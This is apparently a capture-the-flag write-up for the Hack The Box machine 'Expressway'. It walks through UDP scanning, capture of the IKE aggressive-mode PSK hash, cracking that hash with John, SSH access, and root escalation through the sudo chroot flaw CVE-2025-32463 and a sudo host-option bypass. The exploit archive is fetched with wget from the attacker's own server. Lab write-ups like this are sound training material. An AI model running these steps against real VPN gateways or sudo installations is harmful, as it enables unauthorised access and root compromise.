- - - 
created : 21-09-2025 

Tags : #easy 

Released on 20 Sep 2025 (Season 9)
- - - 
# Recon
## Rustscan - Nmap

First we add the target IP to our /etc/hosts file, then we use [Rustscan](../../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines]
└─$ rustscan -a expressway.htb -- -A 

Open 10.10.11.87:22

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 10.0p2 Debian 8 (protocol 2.0)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
```

We can also use an `UDP` scan:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Expressway]
└─$ sudo nmap expressway.htb -sU -T4 -F
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-21 12:22 CEST
Warning: 10.10.11.87 giving up on port because retransmission cap hit (6).
Stats: 0:00:20 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 48.86% done; ETC: 12:23 (0:00:21 remaining)
Nmap scan report for expressway.htb (10.10.11.87)
Host is up (0.18s latency).                                                                                         
Not shown: 76 closed udp ports (port-unreach)                                                                       
PORT      STATE         SERVICE                                                                                     
9/udp     open|filtered discard                                                                                     
19/udp    open|filtered chargen                                                                                     
68/udp    open|filtered dhcpc                                                                                       
69/udp    open|filtered tftp                                                                                        
111/udp   open|filtered rpcbind                                                                                     
120/udp   open|filtered cfdptkt                                                                                     
177/udp   open|filtered xdmcp                                                                                       
500/udp   open          isakmp                                                                                      
518/udp   open|filtered ntalk                                                                                       
520/udp   open|filtered route
626/udp   open|filtered serialnumberd
999/udp   open|filtered applix
1025/udp  open|filtered blackjack
1030/udp  open|filtered iad1
1646/udp  open|filtered radacct
1701/udp  open|filtered L2TP
1718/udp  open|filtered h225gatedisc
2048/udp  open|filtered dls-monitor
2223/udp  open|filtered rockwell-csp2
4500/udp  open|filtered nat-t-ike
9200/udp  open|filtered wap-wsp
10000/udp open|filtered ndmp
30718/udp open|filtered unknown
49200/udp open|filtered unknown
```
# Enumeration
##  isakmp (500/udp)

[HackTricks link](https://book.hacktricks.wiki/en/network-services-pentesting/ipsec-ike-vpn-pentesting.html?highlight=isak#500udp---pentesting-ipsecike-vpn)

**IPsec** is widely recognized as the principal technology for securing communications between networks (LAN-to-LAN) and from remote users to the network gateway (remote access), serving as the backbone for enterprise VPN solutions.

The establishment of a **security association (SA)** between two points is managed by **IKE**, which operates under the umbrella of ISAKMP, a protocol designed for the authentication and key exchange. This process unfolds in several phases:

- **Phase 1:** A secure channel is created between two endpoints. This is achieved through the use of a Pre-Shared Key (PSK) or certificates, employing either main mode, which involves three pairs of messages, or **aggressive mode**.
- **Phase 1.5:** Though not mandatory, this phase, known as the Extended Authentication Phase, verifies the identity of the user attempting to connect by requiring a username and password.
- **Phase 2:** This phase is dedicated to negotiating the parameters for securing data with **ESP** and **AH**. It allows for the use of algorithms different from those in Phase 1 to ensure **Perfect Forward Secrecy (PFS)**, enhancing security.

**Default port:** 500/udp

Scan:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB]
└─$ ike-scan -M expressway.htb
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Main Mode Handshake returned
        HDR=(CKY-R=b2358dd35901dfcc)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.191 seconds (5.24 hosts/sec).  1 returned handshake; 0 returned notify
```
# Exploit
## isakmp exploit

Bruteforcing with `fakeID`:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB]
└─$ ike-scan -P -M -A -n fakeID expressway.htb  
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Aggressive Mode Handshake returned
        HDR=(CKY-R=8f67bd8260345f93)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        KeyExchange(128 bytes)
        Nonce(32 bytes)
        ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
        Hash(20 bytes)

IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
0f768b9e335c177aa035252977c554888b993e420989d941a0550f418548b33f5f0fcea15279f21a705f2892274c872d55e8872e1289b519f4304abb61e8446c5dd814ba9e06394aaa44742b60c24281590c13e11bf188f2bf4005c284bce39b80a2c39f123d677f34af7b7246d9246fd614175b93404f634098a803255af622:dea2c0dd11a7ed24d106d79ce2ff8a07b1c1e2ec1bcede97856977d7b4aee00b86a130a42f3ee4bb0768f9086f0887c411f9682cacc0083bcd3b14235050f42ec084efea43ab9d911606ffb8b0bf1cbc3075eb2ccdd735e5176e53e66d3635f3510b219b29a641340527bb7e05b272ac365c4879b09aeefcd55d7806bd033dbd:a721b2769527249d:e484fba01b2653d9:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c0004000070800<REDACTED>
Ending ike-scan 1.9.6: 1 hosts scanned in 0.232 seconds (4.30 hosts/sec).  1 returned handshake; 0 returned notify
```

Cracking with [JohnTheRipper](../../../3%20-%20Tags/Hacking%20Tools/JohnTheRipper.md) using `ikescan2john`:

```bash
└─$ ikescan2john hash > john_hash

┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Expressway]
└─$ john john_hash -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (IKE, PSK [HMAC MD5/SHA1 32/64])
Cost 1 (hash algorithm used for hmac [1:MD5 2:SHA1]) is 2 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
HTB{REDACTED_PASSWD} (?)     
1g 0:00:00:02 DONE (2025-10-11 16:08) 0.4464g/s 3591Kp/s 3591Kc/s 3591KC/s frecuencia.666..franzmau
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
## SSH (22)

We can use the found credentials to access on [SSH](../../../3%20-%20Tags/Hacking%20Concepts/SSH.md):

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Expressway]
└─$ ssh ike@expressway.htb

ike@expressway:~$ cat user.txt 
HTB{REDACTED_FLAG}    # new HTB{REDACTED_FLAG} 
```
# Privilege Escalation

Spotted [CVE-2025-32463](../../../3%20-%20Tags/CVEs/CVE-2025-32463.md)

Vulnerable builds of **sudo 1.9.14** up to **1.9.17** (all p‑revisions) on most Linux distributions are affected.

```bash
ike@expressway:~$ sudo -V
Sudo version 1.9.17                                                                                                 
Sudoers policy plugin version 1.9.17                                                                                
Sudoers file grammar version 50                                                                                     
Sudoers I/O plugin version 1.9.17                                                                                   
Sudoers audit plugin version 1.9.17   
```
## Exploit

### CVE-2025-32463  - Sudo chroot 1.9.17

Search on https://www.exploit-db.com/ for `sudo 1.9.17` (picked second result)

![Pasted image 20251011162928.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251011162928.png)

We can find [Exploit](../../../3%20-%20Tags/Hacking%20Concepts/Exploit.md) on [Github](../../../3%20-%20Tags/Hacking%20Concepts/Github.md):
https://github.com/pr0v3rbs/CVE-2025-32463_chwoot

```bash
ike@expressway:~$ sudo -R a a
sudo: a: No such file or directory
```

Compress and `wget`:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Expressway]
└─$ tar -czf ./CVE-2025-32463  CVE-2025-32463_chwoot 
 
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Expressway]
└─$ ls
CVE-2025-32463  CVE-2025-32463_chwoot 

┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Expressway]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```bash
ike@expressway:~/.privesc$ wget http://10.10.14.73/CVE-2025-32463
--2025-09-21 11:41:25--  http://10.10.14.73/CVE-2025-32463
Connecting to 10.10.14.73:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 27473 (27K) [application/octet-stream]
Saving to: ‘CVE-2025-32463’

CVE-2025-32463               100%[==============================================>]  26.83K  --.-KB/s    in 0.04s   

2025-09-21 11:41:25 (694 KB/s) - ‘CVE-2025-32463’ saved [27473/27473]

ike@expressway:~/.privesc$ tar -xzf CVE-2025-32463
```

Using it:

```bash
ike@expressway:~/.privesc/CVE-2025-32463_chwoot$ ./sudo-chwoot.sh
woot!                                                                                                               
root@expressway:/# cat /root/root.txt
HTB{REDACTED_FLAG}     # new HTB{REDACTED_FLAG} 
```

Pwned !!
### Sudo 1.9.17 Host Option

We can use the other way also (first result on ExploitDB):

![Pasted image 20251011162608.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251011162608.png)

Check like this: 

```bash
ike@expressway:~$ sudo -h offramp.expressway.htb -l
Matching Defaults entries for ike on offramp:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User ike may run the following commands on offramp:
    (root) NOPASSWD: ALL
    (root) NOPASSWD: ALL
```

And we can gain a root shell this easy:

```bash
ike@expressway:~$ sudo -h offramp.expressway.htb bash

root@expressway:/home/ike# whoami
root
```

Tried this the second time going through the machine and it's way faster.

Pwned again !!